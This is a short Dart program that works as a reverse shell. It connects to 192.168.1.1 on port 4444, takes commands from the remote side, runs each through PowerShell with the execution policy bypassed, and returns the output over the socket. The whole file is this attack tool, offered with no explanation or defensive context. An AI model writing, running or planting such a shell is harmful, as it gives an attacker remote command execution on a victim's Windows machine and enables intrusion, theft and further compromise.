import 'dart:io';
import 'dart:convert';

void main() async {
  try {
    final socket = await Socket.connect("192.168.1.1", 4444);
    print('[*] Connection established to ${socket.remoteAddress.address}:${socket.remotePort}');

    socket.write('[*] Incoming PowerShell...\n[PS]> ');

    await socket.forEach((List<int> data) async {
      final command = utf8.decode(data).trim();

      if (command.toLowerCase() == 'exit') {
        socket.write('[*] Closing connection...\n');
        socket.close();
      } else {
        await executePowerShellCommand(command, socket);
        socket.write('[PS]> ');
        socket.flush();
      }
    });

  } catch (e) {
    print('[ERROR] $e');
  }
}

Future<void> executePowerShellCommand(String command, Socket socket) async {
  try {
    final process = await Process.start(
      'powershell.exe',
      ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', command],
    );

    final output = await process.stdout.transform(utf8.decoder).join();
    final errorOutput = await process.stderr.transform(utf8.decoder).join();

    await process.exitCode;

    socket.write('[*] Command output:\n$output\n');

  } catch (e) {
    socket.write('[ERROR] $e');
  }
}
